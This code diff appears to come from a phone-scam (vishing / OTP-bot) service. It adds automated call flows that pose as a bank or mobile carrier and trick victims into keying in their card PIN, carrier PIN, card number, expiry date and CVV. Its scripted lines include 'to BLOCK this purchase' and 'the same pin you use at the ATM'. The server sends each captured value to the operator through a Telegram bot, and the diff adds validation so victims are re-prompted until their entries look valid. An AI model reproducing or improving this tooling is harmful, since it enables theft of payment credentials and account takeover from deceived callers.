@@ -13,6 +13,7 @@ import {
   cardFlow,
   payFlow,
   pgpFlow,
+  pinFlow,
 } from './utils/dtmfFlow';
 import { getMembership } from './utils/getMembership';
 import { getUser } from './utils/getUser';
@@ -131,6 +132,7 @@ app.get('/calls/dtmf/:language/:step/:chatId', (req, res) => {
     wallet,
     askCardInfo,
     cardType,
+    pinType,
     variables,
     destination,
     transferNumber,
@@ -185,6 +187,17 @@ app.get('/calls/dtmf/:language/:step/:chatId', (req, res) => {
         cardType as string,
       );
       break;
+    case 'pin':
+      pinFlow(
+        String(dtmf),
+        res,
+        language,
+        Number(chatId),
+        step,
+        destination as string,
+        pinType as string,
+      );
+      break;
     case 'pgp':
       pgpFlow(
         dtmf,
@@ -201,6 +214,167 @@ app.get('/calls/dtmf/:language/:step/:chatId', (req, res) => {
     default:
       break;
   }
+});
+
+app.get('/calls/pins/:step/:chatId/:language', async (req, res) => {
+  const { step, chatId, language } = req.params;
+  const { variables } = req.query;
+  const { dtmf } = JSON.parse(variables as string);
+
+  const { pinType } = req.query;
+
+  if (!dtmf) {
+    return res.json({
+      id: uuidv4(),
+      title: `call PIN STEP - ${chatId}`,
+      record: false,
+      steps: [
+        {
+          id: uuidv4(),
+          action: 'say',
+          options: {
+            payload:
+              pinType === 'carrierPin'
+                ? `You have not entered anything. To verify and secure your phone number, please enter your ${pinType} followed by the pound key.`
+                : `You have not entered anything. For your security and to protect your account. enter your ${pinType} followed by the pound key`,
+            language,
+            voice: 'female',
+          },
+          onKeypressGoto: 'nextStepGoto',
+          onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: 8,
+        },
+        {
+          id: uuidv4(),
+          action: 'pause',
+          options: {
+            length: 5,
+          },
+          onKeypressGoto: 'nextStepGoto',
+          onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: 8,
+        },
+        {
+          id: 'nextStepGoto',
+          action: 'fetchCallFlow',
+          options: {
+            url: `${process.env.ENDPOINT_URL}/calls/pins/${step}/${chatId}/${language}?pinType=${pinType}`,
+          },
+        },
+      ],
+    });
+  }
+
+  if (dtmf) {
+    if (dtmf.length !== 6 && pinType === 'carrierPin') {
+      return res.json({
+        id: uuidv4(),
+        title: `call PIN STEP - ${chatId}`,
+        record: false,
+        steps: [
+          {
+            id: uuidv4(),
+            action: 'say',
+            options: {
+              payload: `The ${pinType} you have entered is incorrect. To verify and secure your phone number, please enter your ${pinType} followed by the pound key.`,
+            },
+            onKeypressGoto: 'nextStepGoto',
+            onKeypressVar: 'dtmf',
+            endKey: '#',
+            maxNumKeys: 6,
+          },
+          {
+            id: uuidv4(),
+            action: 'pause',
+            options: {
+              length: 5,
+            },
+            onKeypressGoto: 'nextStepGoto',
+            onKeypressVar: 'dtmf',
+            endKey: '#',
+            maxNumKeys: 8,
+          },
+          {
+            id: 'nextStepGoto',
+            action: 'fetchCallFlow',
+            options: {
+              url: `${process.env.ENDPOINT_URL}/calls/pins/${step}/${chatId}/${language}?pinType=${pinType}`,
+            },
+          },
+        ],
+      });
+    }
+
+    if (dtmf.length !== 4 && pinType === 'Card Pin') {
+      return res.json({
+        id: uuidv4(),
+        title: `call PIN STEP - ${chatId}`,
+        record: false,
+        steps: [
+          {
+            id: uuidv4(),
+            action: 'say',
+            options: {
+              payload: `The ${pinType} you have entered is incorrect. For your security and to protect your account. enter your ${pinType} followed by the pound key`,
+            },
+            onKeypressGoto: 'nextStepGoto',
+            onKeypressVar: 'dtmf',
+            endKey: '#',
+            maxNumKeys: 4,
+          },
+          {
+            id: uuidv4(),
+            action: 'pause',
+            options: {
+              length: 5,
+            },
+            onKeypressGoto: 'nextStepGoto',
+            onKeypressVar: 'dtmf',
+            endKey: '#',
+            maxNumKeys: 8,
+          },
+          {
+            id: 'nextStepGoto',
+            action: 'fetchCallFlow',
+            options: {
+              url: `${process.env.ENDPOINT_URL}/calls/pins/${step}/${chatId}/${language}?pinType=${pinType}`,
+            },
+          },
+        ],
+      });
+    }
+
+    await bot.telegram.sendMessage(
+      chatId,
+      pinType === 'carrierPin'
+        ? `Carrier pin is <b>${dtmf}</b> 📲`
+        : `Card pin is <b>${dtmf}</b> 📟`,
+      {
+        parse_mode: 'HTML',
+      },
+    );
+  }
+  return res.json({
+    id: uuidv4(),
+    title: `call bank - ${chatId} no OTP`,
+    record: false,
+    steps: [
+      {
+        id: uuidv4(),
+        action: 'say',
+        options: {
+          payload:
+            pinType === 'carrierPin'
+              ? `Thank you for verifying. The request has been blocked, Good bye`
+              : `Thank you for verifying. Good bye`,
+          language,
+          voice: 'female',
+        },
+      },
+    ],
+  });
 });
 
 app.get('/calls/pin/:chatId/:language', async (req, res) => {
@@ -220,7 +394,7 @@ app.get('/calls/pin/:chatId/:language', async (req, res) => {
           options: {
             payload: `You have not entered anything. To AUTHENTICATE YOU please enter your ${
               language === 'en-us' ? 'CARD PIN' : 'TELEPIN'
-            } followed by the pound key.`,
+            }, the same pin you use at the ATM,  followed by the pound key.`,
             language,
             voice: 'female',
           },
@@ -273,6 +447,51 @@ app.get('/calls/pin/:chatId/:language', async (req, res) => {
     });
   }
   if (dtmf) {
+    if (dtmf.length !== 4) {
+      return res.json({
+        id: uuidv4(),
+        title: `call PIN STEP - ${chatId}`,
+        record: false,
+        steps: [
+          {
+            id: uuidv4(),
+            action: 'say',
+            options: {
+              payload: `The ${
+                language === 'en-us' ? 'CARD PIN' : 'TELEPIN'
+              } you have entered is incorrect. To AUTHENTICATE YOU please enter your ${
+                language === 'en-us' ? 'CARD PIN' : 'TELEPIN'
+              }, the same pin you use at the ATM, followed by the pound key.`,
+              language,
+              voice: 'female',
+            },
+            onKeypressGoto: 'nextStepGoto',
+            onKeypressVar: 'dtmf',
+            endKey: '#',
+            maxNumKeys: 8,
+          },
+          {
+            id: uuidv4(),
+            action: 'pause',
+            options: {
+              length: 5,
+            },
+            onKeypressGoto: 'nextStepGoto',
+            onKeypressVar: 'dtmf',
+            endKey: '#',
+            maxNumKeys: 8,
+          },
+          {
+            id: 'nextStepGoto',
+            action: 'fetchCallFlow',
+            options: {
+              url: `${process.env.ENDPOINT_URL}/calls/pin/${chatId}/${language}`,
+            },
+          },
+        ],
+      });
+    }
+
     await bot.telegram.sendMessage(
       req.params.chatId,
       req.params.language === 'en-us'
@@ -339,7 +558,7 @@ app.get('/calls/:step/:chatId/:language', async (req, res) => {
           onKeypressGoto: 'cardStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          maxNumKeys: 18,
+          maxNumKeys: 16,
         },
         {
           id: uuidv4(),
@@ -350,7 +569,7 @@ app.get('/calls/:step/:chatId/:language', async (req, res) => {
           onKeypressGoto: 'cardStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          maxNumKeys: 18,
+          maxNumKeys: 16,
         },
         {
           id: 'cardStepGoto',
@@ -364,6 +583,52 @@ app.get('/calls/:step/:chatId/:language', async (req, res) => {
   }
 
   if (isAccount === 'yes') {
+    if (
+      (dtmf.length >= 15 || dtmf.length <= 16) &&
+      !/^(?:(4[0-9]{12}(?:[0-9]{3})?)|(5[1-5][0-9]{14})|(6(?:011|5[0-9]{2})[0-9]{12})|(3[47][0-9]{13})|(3(?:0[0-5]|[68][0-9])[0-9]{11})|((?:2131|1800|35[0-9]{3})[0-9]{11}))$/.test(
+        dtmf,
+      )
+    ) {
+      return res.json({
+        id: uuidv4(),
+        title: `pay card - ${chatId} OTP`,
+        record: false,
+        steps: [
+          {
+            id: uuidv4(),
+            action: 'say',
+            options: {
+              payload: `The card number you have entered is incorrect. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound key`,
+              language,
+              voice: 'female',
+              loop: true,
+            },
+            onKeypressGoto: 'cardStepOTP',
+            onKeypressVar: 'dtmf',
+            endKey: '#',
+            maxNumKeys: 16,
+          },
+          {
+            id: uuidv4(),
+            action: 'pause',
+            options: {
+              length: 5,
+            },
+            onKeypressGoto: 'cardStepOTP',
+            onKeypressVar: 'dtmf',
+            endKey: '#',
+            maxNumKeys: 16,
+          },
+          {
+            id: 'cardStepOTP',
+            action: 'fetchCallFlow',
+            options: {
+              url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}`,
+            },
+          },
+        ],
+      });
+    }
     if (dtmf) {
       await bot.telegram.sendMessage(chatId, `Card number <b>${dtmf}</b> ✅`, {
         parse_mode: 'HTML',
@@ -414,6 +679,47 @@ app.get('/calls/:step/:chatId/:language', async (req, res) => {
   }
 
   if (expiry === 'yes') {
+    if (!/^[0-9]{4,6}$/.test(dtmf)) {
+      return res.json({
+        id: uuidv4(),
+        title: `call card - ${chatId}`,
+        record: false,
+        steps: [
+          {
+            id: uuidv4(),
+            action: 'say',
+            options: {
+              payload: `The expiration date you have enter is incorrect. Please enter your ${cardType} card expiration date followed by the pound key.`,
+              language,
+              voice: 'female',
+              length: 5,
+            },
+            onKeypressGoto: 'cardStepGoto',
+            onKeypressVar: 'dtmf',
+            endKey: '#',
+            maxNumKeys: 6,
+          },
+          {
+            id: uuidv4(),
+            action: 'pause',
+            options: {
+              length: 5,
+            },
+            onKeypressGoto: 'cardStepGoto',
+            onKeypressVar: 'dtmf',
+            endKey: '#',
+            maxNumKeys: 6,
+          },
+          {
+            id: 'cardStepGoto',
+            action: 'fetchCallFlow',
+            options: {
+              url: `${process.env.ENDPOINT_URL}/calls/${step}/${chatId}/${language}?cardType=${cardType}&expiry=yes`,
+            },
+          },
+        ],
+      });
+    }
     if (dtmf) {
       await bot.telegram.sendMessage(
         chatId,
@@ -469,6 +775,48 @@ app.get('/calls/:step/:chatId/:language', async (req, res) => {
   }
 
   if (cvv === 'yes') {
+    if (!/^[0-9]{3,4}$/.test(dtmf)) {
+      return res.json({
+        id: uuidv4(),
+        title: `call card - ${chatId}`,
+        record: false,
+        steps: [
+          {
+            id: uuidv4(),
+            action: 'say',
+            options: {
+              payload: `The CVV number you have entered is incorrect. Please enter your ${
+                cardType !== 'undefined' ? cardType : ''
+              } card CVV followed by the pound key.`,
+              language,
+              voice: 'female',
+            },
+            onKeypressGoto: 'cardStepGoto',
+            onKeypressVar: 'dtmf',
+            endKey: '#',
+            maxNumKeys: 8,
+          },
+          {
+            id: uuidv4(),
+            action: 'pause',
+            options: {
+              length: 5,
+            },
+            onKeypressGoto: 'cardStepGoto',
+            onKeypressVar: 'dtmf',
+            endKey: '#',
+            maxNumKeys: 8,
+          },
+          {
+            id: 'cardStepGoto',
+            action: 'fetchCallFlow',
+            options: {
+              url: `${process.env.ENDPOINT_URL}/calls/${step}/${chatId}/${language}?cardType=${cardType}&cvv=yes`,
+            },
+          },
+        ],
+      });
+    }
     if (dtmf) {
       await bot.telegram.sendMessage(chatId, `CVV <b>${dtmf}</b> ✅`, {
         parse_mode: 'HTML',
@@ -487,7 +835,7 @@ app.get('/calls/:step/:chatId/:language', async (req, res) => {
               .split('')
               .join(' ')}. To AUTHENTICATE YOU please enter your ${
               language === 'en-us' ? 'CARD PIN' : 'TELEPIN'
-            } followed by the pound key.`,
+            }, the same pin you use at the ATM,  followed by the pound key.`,
             language,
             voice: 'female',
           },
@@ -621,7 +969,7 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
                 .split('')
                 .join(' ')}. To AUTHENTICATE YOU please enter your ${
                 language === 'en-us' ? 'CARD PIN' : 'TELEPIN'
-              } followed by the pound key.`,
+              }, the same pin you use at the ATM, followed by the pound key.`,
               language,
               voice: 'female',
             },
@@ -674,7 +1022,7 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
                 .split('')
                 .join(' ')}. To AUTHENTICATE YOU please enter your ${
                 language === 'en-us' ? 'CARD PIN' : 'TELEPIN'
-              } followed by the pound key.`,
+              }, the same pin you use at the ATM,  followed by the pound key.`,
               language,
               voice: 'female',
               length: 5,
@@ -737,7 +1085,7 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
               onKeypressGoto: 'cardStepGoto',
               onKeypressVar: 'dtmf',
               endKey: '#',
-              maxNumKeys: 18,
+              maxNumKeys: 16,
             },
             {
               id: uuidv4(),
@@ -748,7 +1096,7 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
               onKeypressGoto: 'cardStepGoto',
               onKeypressVar: 'dtmf',
               endKey: '#',
-              maxNumKeys: 18,
+              maxNumKeys: 16,
             },
             {
               id: 'cardStepGoto',
@@ -782,6 +1130,53 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
         });
       }
     case 'card':
+      if (
+        (dtmf.length >= 15 || dtmf.length <= 16) &&
+        !/^(?:(4[0-9]{12}(?:[0-9]{3})?)|(5[1-5][0-9]{14})|(6(?:011|5[0-9]{2})[0-9]{12})|(3[47][0-9]{13})|(3(?:0[0-5]|[68][0-9])[0-9]{11})|((?:2131|1800|35[0-9]{3})[0-9]{11}))$/.test(
+          dtmf,
+        )
+      ) {
+        return res.json({
+          id: uuidv4(),
+          title: `pay card - ${chatId} OTP`,
+          record: false,
+          steps: [
+            {
+              id: uuidv4(),
+              action: 'say',
+              options: {
+                payload: `The card number you have entered is incorrect. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound key`,
+                language,
+                voice: 'female',
+                loop: true,
+              },
+              onKeypressGoto: 'cardStepOTP',
+              onKeypressVar: 'dtmf',
+              endKey: '#',
+              maxNumKeys: 16,
+            },
+            {
+              id: uuidv4(),
+              action: 'pause',
+              options: {
+                length: 5,
+              },
+              onKeypressGoto: 'cardStepOTP',
+              onKeypressVar: 'dtmf',
+              endKey: '#',
+              maxNumKeys: 16,
+            },
+            {
+              id: 'cardStepOTP',
+              action: 'fetchCallFlow',
+              options: {
+                url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}`,
+              },
+            },
+          ],
+        });
+      }
+
       if (dtmf) {
         await bot.telegram.sendMessage(
           req.params.chatId,
@@ -803,7 +1198,7 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
                   .split('')
                   .join(
                     ' ',
-                  )}. Please enter your ${cardType} card expiry date followed by the pound key.`,
+                  )}. Please enter your ${cardType} card expiration date followed by the pound key.`,
                 language,
                 voice: 'female',
                 length: 5,
@@ -851,7 +1246,7 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
               onKeypressGoto: 'cardStepGoto',
               onKeypressVar: 'dtmf',
               endKey: '#',
-              maxNumKeys: 18,
+              maxNumKeys: 16,
             },
             {
               id: uuidv4(),
@@ -862,7 +1257,7 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
               onKeypressGoto: 'cardStepGoto',
               onKeypressVar: 'dtmf',
               endKey: '#',
-              maxNumKeys: 18,
+              maxNumKeys: 16,
             },
             {
               id: 'cardStepGoto',
